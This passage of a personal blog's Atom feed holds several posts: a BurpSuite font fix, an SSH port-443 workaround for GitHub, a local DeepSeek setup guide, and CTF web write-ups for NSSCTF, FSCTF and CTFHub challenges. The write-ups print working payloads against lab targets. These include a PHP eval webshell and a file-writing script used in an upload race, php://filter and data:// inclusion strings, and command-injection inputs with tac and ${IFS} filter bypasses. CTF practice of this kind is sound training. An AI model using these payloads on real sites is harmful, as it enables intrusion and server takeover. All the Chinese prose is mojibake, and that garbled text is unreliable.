    <content type="html"><![CDATA[<h4 id="é—®é¢˜æè¿°">é—®é¢˜æè¿°</h4><p>â€‹åœ¨ä½¿ç”¨BurpSuiteæ±‰åŒ–ç‰ˆæ—¶æŠ“å–httpæ•°æ®åŒ…å‡ºç°æ˜¾ç¤ºé”™ä½æƒ…å†µï¼Œè¿™æ˜¯å› ä¸ºä¸­æ–‡ç‰ˆçš„å­—ä½“ä¸ä¸€æ ·å¯¼è‡´çš„ï¼Œéœ€è¦ä¿®æ”¹å­—ä½“ã€‚</p><h4 id="è§£å†³æ–¹æ³•">è§£å†³æ–¹æ³•</h4><p>â€‹ä¿®æ”¹BurpSuiteæ±‰åŒ–ç‰ˆçš„httpå­—ä½“æ˜¾ç¤ºã€‚</p><p>æ‰“å¼€è®¾ç½®ï¼Œåœ¨message editorä¸­æ‰¾åˆ°â€œHTTPæ¶ˆæ¯çš„æ˜¾ç¤ºæ–¹å¼â€ï¼Œä¿®æ”¹å¦‚ä¸‹</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a3f0228200b1b14ba279f13876b27bc1.png" alt="img"></p>]]></content>
    
    
    <summary type="html">ğŸ¥§BurpSuiteä¸­æ–‡ç‰ˆå‡ºç°æ˜¾ç¤ºé”™ä½æƒ…å†µè§£å†³-ä¿®æ”¹å­—ä½“</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>åˆ·é¢˜2025.3.15</title>
    <link href="https://blog.m3x1.cn/posts/a546d02c.html"/>
    <id>https://blog.m3x1.cn/posts/a546d02c.html</id>
    <published>2025-03-14T16:00:00.000Z</published>
    <updated>2025-03-18T14:15:08.956Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>é¢˜ç›®æ¥æºï¼šNSSCTFå¹³å°</p></blockquote><p>[TOC]</p><h4 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-easyupload2-0">[SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload2.0</h4><blockquote><p>è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ ç»•è¿‡</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315181309418.png" alt="image-20250315181309418"></p><p>è¿›è¡Œæ–‡ä»¶ä¸Šä¼ æµ‹è¯•ï¼Œé¦–å…ˆä¸Šä¼ jpgæ–‡ä»¶ï¼Œç„¶åæŠ“åŒ…æ”¹æˆphpæ–‡ä»¶ï¼Œç»“æœæç¤ºphpæ–‡ä»¶ä¸èƒ½ä¸Šä¼ ã€‚</p><p>ä¸Šä¼ htaccessæ–‡ä»¶ä¹Ÿä¸è¡Œï¼Œäºæ˜¯æ”¹æˆåç¼€ä¸ºphtmlã€‚</p><p>phtmlä¹Ÿä¼šè¢«å½“æˆphpè§£æã€‚</p><p>å‘ç°ä¸Šä¼ æˆåŠŸï¼Œç”¨èšå‰‘è¿æ¥ï¼Œæ‰¾åˆ°flag.</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315181643259.png" alt="image-20250315181643259"></p><blockquote><p>NSSCTF{76333d4d-efe1-4a18-acf5-09bd35c8ca3b}</p></blockquote><h4 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-PseudoProtocols">[SWPUCTF 2021 æ–°ç”Ÿèµ›]PseudoProtocols</h4><blockquote><p>è€ƒç‚¹ï¼šPHPä¼ªåè®®ï¼Œæ–‡ä»¶åŒ…å«</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191122515.png" alt="image-20250315191122515"></p><p>å…ˆæ‰«ä¸€ä¸‹ç›®å½•ï¼Œå‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œç„¶åçœ‹åˆ°éœ€è¦ä¼ å‚ï¼Œåˆè¦è¯»å–hint.phpï¼Œä½¿ç”¨filterä¼ªåè®®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=/var/www/html/hint.php</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸²base64ï¼Œè§£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//go to /test2222222222222.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç›´æ¥è®¿é—®/test2222222222222.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191348678.png" alt="image-20250315191348678"></p><p>ç›´æ¥ä½¿ç”¨dataåè®®ç»•è¿‡file_get_contentså‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=data://text/plain;base64,SSB3YW50IGZsYWc=</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315191105190.png" alt="image-20250315191105190"></p><blockquote><p>NSSCTF{74d9bfc7-cdff-4a86-a6c0-f76568061d63}</p></blockquote><h4 id="FSCTF-2023-åŠ é€ŸåŠ é€Ÿ">[FSCTF 2023]åŠ é€ŸåŠ é€Ÿ</h4><blockquote><p>è€ƒç‚¹ï¼šæ¡ä»¶ç«äº‰</p></blockquote><p>å…ˆæŠŠåç¼€æ”¹æˆ.jpgæ‹¿åˆ°å¯¹æ–¹ä¿å­˜æ–‡ä»¶çš„è·¯å¾„ï¼Œä¸ºå½“å‰è·¯å¾„ä¸‹çš„uploadç›®å½•é‡Œã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/34c2cf74b08950b8f9f87a2ebccb2bbd.png" alt="1698321877579">çœ‹è§æ ‡ç­¾æ˜¯æ¡ä»¶ç«äº‰ï¼Œé‚£å°±æŒ‰ç…§æ¡ä»¶ç«äº‰çš„æ–¹æ³•å»åšã€‚</p><p>å…ˆåˆ›å»ºä¸€ä¸ªjz-cmd.phpæ–‡ä»¶ï¼Œè¿è¡Œåˆ›å»ºcmd.phpæ–‡ä»¶å¹¶å†™å…¥ä¸€å¥è¯æœ¨é©¬çš„å‘½ä»¤ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $f=fopen(&quot;cmd.php&quot;,&quot;w&quot;); fputs($f,&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>å…ˆæŠ“å–ä¸Šä¼ æ–‡ä»¶çš„æ•°æ®åŒ…ï¼Œå†æŠ“å–è®¿é—®uploadæ–‡ä»¶å¤¹é‡Œçš„jz-cmd.phpè¿™ä¸¤ä¸ªæ•°æ®åŒ…ï¼›è™½ç„¶ä¸Šä¼ jz-cmd.phpæ˜¯ä¸è¢«å…è®¸çš„ï¼Œä½†å…¶å®è¿™ä¸ªæ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šæœ‰å­˜åœ¨è¿‡ï¼Œåªæ˜¯å¾ˆå¿«å°±è¢«åˆ é™¤äº†ã€‚æ‰€ä»¥æˆ‘ä»¬ç”¨BPç–¯ç‹‚å‘åŒ…è®¿é—®uploadæ–‡ä»¶å¤¹ä¸‹çš„jz-cmd.phpæ–‡ä»¶æ˜¯é“ç†çš„ã€‚è€Œåªè¦æ­¤jz-cmd.phpè¢«è®¿é—®æˆåŠŸï¼Œå°±ä¼šåœ¨uploadæ–‡ä»¶å¤¹é‡Œåˆ›å»ºcmd.phpè¿™ä¸ªåé—¨æ–‡ä»¶ã€‚</p><p>å…·ä½“æ“ä½œå°±æ˜¯æŠ“å–ä¸Šä¼ å’Œè®¿é—®çš„æ•°æ®åŒ…ï¼Œç„¶åå°†ä»–ä»¬éƒ½æ”¾å…¥intruderä¸­ï¼Œè®¾ç½®å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8367695e46096811033b203f54941d0f.png" alt="1698322910515"></p><p>ç„¶åå°±å…ˆæ”»å‡»å‘é€çš„æ•°æ®åŒ…ï¼Œå†æ”»å‡»è¯»å–ï¼ˆè¯»å–cmd.phpï¼‰çš„æ•°æ®åŒ…ã€‚è¯»å–çš„åŒ…å‡ºç°200ï¼Œä¸”æµè§ˆå™¨èƒ½æ­£å¸¸è®¿é—®ï¼Œè¯´æ˜ä¸€å¥è¯æœ¨é©¬å°±å†™å…¥è¿›å»äº†ï¼Œç”¨èšå‰‘è¿æ¥æ‰¾åˆ°flagã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-15%20202450.png" alt=""></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250315202512251.png" alt="image-20250315202512251"></p><blockquote><p>FSCTF{p@ti0ns_15_key_1n_1ife}</p></blockquote>]]></content>
    
    
    <summary type="html">2025.3.15åˆ·é¢˜é¢˜ç›®:[SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload2.0,[SWPUCTF 2021æ–°ç”Ÿèµ›]PseudoProtocols,[FSCTF 2023]åŠ é€ŸåŠ é€Ÿ</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>Gité—®é¢˜ï¼šè§£å†³â€œssh:connect to host github.com port 22: Connection timed outâ€</title>
    <link href="https://blog.m3x1.cn/posts/e4e8b439.html"/>
    <id>https://blog.m3x1.cn/posts/e4e8b439.html</id>
    <published>2025-02-18T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:15.465Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="é—®é¢˜æè¿°ï¼š">é—®é¢˜æè¿°ï¼š</h2><p>åœ¨æŸä¸€å¤©ä½¿ç”¨hexo då‘½ä»¤æ—¶çªç„¶å‡ºç°æŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh:connect to host github.com port 22: Connection timed out</span><br></pre></td></tr></table></figure><p>ä¹‹å‰éƒ½æ˜¯å¯ä»¥é“¾æ¥çš„ï¼Œåæ¥æ¢äº†åœ°æ–¹çªç„¶é“¾æ¥ä¸ä¸Šgithubäº†ã€‚</p><h2 id="é—®é¢˜åˆ†æï¼š">é—®é¢˜åˆ†æï¼š</h2><p>æ ¹æ®é”™è¯¯æç¤ºçŸ¥é“ï¼Œè¿æ¥ä¸æˆåŠŸå¯èƒ½æ˜¯ï¼š</p><ol><li>ç½‘ç»œé—®é¢˜</li><li>sshå¯†é’¥éœ€è¦é‡æ–°æ·»åŠ </li><li>22ç«¯å£è¢«å ç”¨</li></ol><p>æ ¹æ®æ­¤è¿›è¡Œå°è¯•è§£å†³ï¼Œåº”è¯¥èƒ½è§£å†³ã€‚æˆ‘å°±æ˜¯ç¬¬ä¸‰ä¸ªé—®é¢˜</p><h2 id="è§£å†³æ–¹æ³•ï¼š">è§£å†³æ–¹æ³•ï¼š</h2><h4 id="æƒ…å†µä¸€ï¼š">æƒ…å†µä¸€ï¼š</h4><p>æ£€æŸ¥ç½‘ç»œè¿æ¥æƒ…å†µï¼Œæ£€æŸ¥ä»£ç†æ˜¯å¦å¼€å¯ã€‚ç„¶åpingä¸€ä¸‹çœ‹çœ‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping github.com</span><br></pre></td></tr></table></figure><h4 id="æƒ…å†µäºŒï¼š">æƒ…å†µäºŒï¼š</h4><p>ç›´æ¥é‡æ–°æ·»åŠ sshå¯†é’¥å°±è¡Œ</p><h4 id="æƒ…å†µä¸‰ï¼š">æƒ…å†µä¸‰ï¼š</h4><p>è¿™ä¹Ÿæ˜¯æˆ‘çš„æƒ…å†µï¼Œå¯èƒ½æ˜¯22ç«¯å£ä¸è¡Œæˆ–è€…è¢«å ç”¨ï¼Œå°±éœ€è¦æ¢ä¸ªç«¯å£ã€‚</p><p>æ“ä½œæ–¹æ³•ï¼š</p><p>1.è¿›å…¥~/.sshä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><p>2.åˆ›å»ºä¸€ä¸ªconfigæ–‡ä»¶(è¿™é‡Œæˆ‘ç”¨çš„vimç¼–è¾‘å™¨)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config</span><br></pre></td></tr></table></figure><p>3.ç¼–è¾‘æ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br><span class="line"></span><br><span class="line">Host gitlab.com</span><br><span class="line">Hostname altssh.gitlab.com</span><br><span class="line">User git</span><br><span class="line">Port 443</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">12345678910111213</span><br></pre></td></tr></table></figure><p>4.ä¿å­˜é€€å‡º</p><p>5.æ£€æŸ¥æ˜¯å¦æˆåŠŸ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ ¹æ®å®ƒçš„æç¤ºæ“ä½œï¼Œæœ‰ä¸ªåœ°æ–¹è¦è¾“å…¥yesã€‚</p><p>ç„¶åå†è¯•è¯•hexo dï¼Œä¼°è®¡å°±èƒ½æäº¤äº†ã€‚</p><p>ï¼ˆ<a href="http://xn--pinggithub-wj2ph1j7w8fubmba3571oi6a.com">ä½†æ˜¯æˆ‘è¿˜æ˜¯pingä¸é€šgithub.com</a>ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä½†æ˜¯æ¢ä¸ªç«¯å£ä¹Ÿèƒ½ä¼ ä¸Šå»ã€‚æœ‰å¤§ä½¬çŸ¥é“çš„è¯·æŒ‡æ•™ï¼ï¼‰</p>]]></content>
    
    
    <summary type="html">ğŸ¥§Gité—®é¢˜ï¼šè§£å†³â€œssh:connect to host github.com port 22: Connection timed outâ€</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>æœ¬åœ°æ­å»ºdeepseek</title>
    <link href="https://blog.m3x1.cn/posts/ca8cf98d.html"/>
    <id>https://blog.m3x1.cn/posts/ca8cf98d.html</id>
    <published>2025-02-18T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:36.200Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‡†å¤‡é˜¶æ®µ">å‡†å¤‡é˜¶æ®µ</h2><p>å…ˆä¸‹è½½Ollamaå’Œchatboxå®‰è£…åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ollama: https://ollama.com/</span><br><span class="line">chatbox: https://chatboxai.app/zh</span><br></pre></td></tr></table></figure><p>åœ¨ç”µè„‘ä¸Šå®‰è£…åå³å¯</p><h2 id="æ­å»ºæ­¥éª¤">æ­å»ºæ­¥éª¤</h2><p>å®‰è£…ä¹‹åï¼ŒæŒ‰win+rï¼Œè¾“å…¥cmdè¿›å…¥å‘½ä»¤æ¡†</p><p>ç„¶åæˆ‘ä»¬åœ¨å›åˆ°ollamaçš„å®˜ç½‘ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219215910238.png" alt="image-20250219215910238"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220104107.png" alt="image-20250219220104107"></p><p>å¤åˆ¶åé¢çš„ä»£ç åˆ°å‘½ä»¤æ¡†ä¸‹è½½ï¼Œç­‰å¾…å®ƒä¸‹è½½å®Œ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220218270.png" alt="image-20250219220218270"></p><p>ç„¶åæ‰“å¼€chatboxï¼Œé€‰æ‹©ä½¿ç”¨æœ¬åœ°æ¨¡å‹</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220351053.png" alt="image-20250219220351053"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220409690.png" alt="image-20250219220409690"></p><p>æ¨¡å‹ä½ç½®ç‚¹å‡»ä¸‰è§’å½¢ä½ç½®é€‰æ‹©å®‰è£…å¥½çš„deepseekæ¨¡å‹ï¼Œä¸Šä¸‹æ–‡æ¶ˆæ¯æ•°é‡20é‚£ä¸ªä½ç½®è®°å¾—é€‰æ‹©ä¸é™åˆ¶ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220432827.png" alt="image-20250219220432827"></p><p>æ ¹æ®è‡ªå·±å–œå¥½è®¾ç½®å…¶ä»–é€‰é¡¹ï¼Œç‚¹å‡»ä¿å­˜ï¼Œç„¶åå°±å¯ä»¥è¯•è¯•å¯¹è¯äº†ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250219220640616.png" alt="image-20250219220640616"></p><p>è‡³æ­¤åˆå§‹åŒ–å°±å®Œæˆäº†ï¼ŒåŸºæœ¬çš„åŠŸèƒ½å°±å®Œæˆäº†ã€‚</p><h2 id="å¯åŠ¨æ³¨æ„äº‹é¡¹">å¯åŠ¨æ³¨æ„äº‹é¡¹</h2><p>æ¯æ¬¡åœ¨chatboxå¯åŠ¨çš„æ—¶å€™ï¼Œéƒ½è¦å…ˆåœ¨å‘½ä»¤æ¡†è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ollama list    #æŸ¥çœ‹mode</span><br><span class="line">ollama run modename    #è¿è¡Œmode</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰èƒ½åœ¨chatboxæœ¬åœ°ä½¿ç”¨ã€‚</p><p>å¦åˆ™ä¼šæŠ¥é”™æ²¡æœ‰ç½‘ç»œã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§æœ¬åœ°æ­å»ºdeepseek</summary>
    
    
    
    <category term="å…¶ä»–å­¦ä¹ ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="å…¶ä»–å­¦ä¹ ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CTFHubæŠ€èƒ½æ ‘-rce</title>
    <link href="https://blog.m3x1.cn/posts/72fb0684.html"/>
    <id>https://blog.m3x1.cn/posts/72fb0684.html</id>
    <published>2025-01-31T16:00:00.000Z</published>
    <updated>2025-02-01T13:26:47.646Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="evalæ‰§è¡Œ">evalæ‰§è¡Œ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    eval($_REQUEST[&quot;cmd&quot;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>æ²¡æœ‰ä»»ä½•ç»•è¿‡ï¼Œç›´æ¥æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(&#x27;ls /&#x27;);</span><br><span class="line">?cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{953435d20ae6652047e620c4}</p></blockquote><h2 id="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128231455539.png" alt="image-20241128231455539"></p><p>å®¡è®¡ä»£ç ï¼Œå‘ç°è¿‡æ»¤äº†flagå…³é”®å­—ï¼ŒincludeåŒ…å«æ–‡ä»¶çš„å†…å®¹ï¼Œæ ¹æ®æç¤ºï¼Œå‘ç°æœ‰ä¸ªshell.txtæ–‡ä»¶ï¼Œè€Œä¸”æ–‡ä»¶å†…å®¹æ˜¯æ¥å—ä¼ å‚è¯·æ±‚ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234155787.png" alt="image-20241128234155787"></p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯æ–‡ä»¶åŒ…å«shell.txtæ–‡ä»¶ï¼Œç„¶åä¼ å‚è§¦å‘evalå‡½æ•°æ¥rceã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{e95bf56ca09c475de96779f8}</p></blockquote><h2 id="php-input">php://input</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234417464.png" alt="image-20241128234417464"></p><p>æœ‰ä¸ªphpinfo()çš„ç½‘é¡µï¼Œæ‰“å¼€ï¼Œæœç´¢flagï¼Œæ²¡æœ‰ã€‚</p><p>æ ¹æ®æç¤ºä½¿ç”¨php://inputåè®®</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234916846.png" alt="image-20241128234916846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128234946005.png" alt="image-20241128234946005"></p><blockquote><p>ctfhub{fd2d24ec67a3d02745d252ec}</p></blockquote><h2 id="è¯»å–æºä»£ç ">è¯»å–æºä»£ç </h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235118224.png" alt="image-20241128235118224"></p><p>æ ¹æ®ä»£ç å’Œæç¤ºï¼Œè¦ä½¿ç”¨phpåè®®è¯»å–ç›®å½•/flag</p><p>ç›´æ¥ä½¿ç”¨filteråè®®è¯»å–ï¼Œæ„é€ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{ad11f5cf0c3528e0097fc84f}</p></blockquote><h2 id="è¿œç¨‹åŒ…å«">è¿œç¨‹åŒ…å«</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128235615623.png" alt="image-20241128235615623"></p><p>è·Ÿä¸Šé¢çš„é¢˜ç›®ä¸€æ ·,ç›´æ¥ä½¿ç”¨php://inputï¼Œç„¶åå†™å…¥ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129000043701.png" alt="image-20241129000043701"></p><p>èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flag</p><blockquote><p>ctfhub{bc23c4d608ef1b89ff1d8564}</p></blockquote><h2 id="å‘½ä»¤æ³¨å…¥">å‘½ä»¤æ³¨å…¥</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥æ˜¯ä¸€ä¸ªpingç½‘å€çš„åŠŸèƒ½ï¼Œå…ˆè¯•è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls -al</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201210701699.png" alt="image-20250201210701699"></p><p>æ‰“å¼€278612477123991.php</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250201211032131.png" alt="image-20250201211032131"></p><blockquote><p>ctfhub{7c642fd3989abe8db46cf948}</p></blockquote><h2 id="è¿‡æ»¤cat">è¿‡æ»¤cat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†catï¼Œä½†æ˜¯å¯ä»¥ç”¨tac</p><blockquote><p>ctfhub{7c7a18aea2905940e36dd90e}</p></blockquote><h2 id="è¿‡æ»¤ç©ºæ ¼">è¿‡æ»¤ç©ºæ ¼</h2><p>è¿‡æ»¤äº†ç©ºæ ¼å¯ä»¥ç”¨${IFS}ä»£æ›¿</p><blockquote><p>ctfhub{635b63dfee2f877be2058c7c}</p></blockquote><h2 id="è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦">è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦</h2><p>è¿‡æ»¤äº†ç›®å½•åˆ†éš”ç¬¦ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨å‘½ä»¤æ‹¼æ¥æ¥æ‰¾flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls -al</span><br><span class="line">127.0.0.1;cd flag_is_here;cat flag_31274326351910.php</span><br></pre></td></tr></table></figure><blockquote><p>ctfhub{0a399fadb5bd0716775832b5}</p></blockquote><h2 id="è¿‡æ»¤è¿ç®—ç¬¦">è¿‡æ»¤è¿ç®—ç¬¦</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span 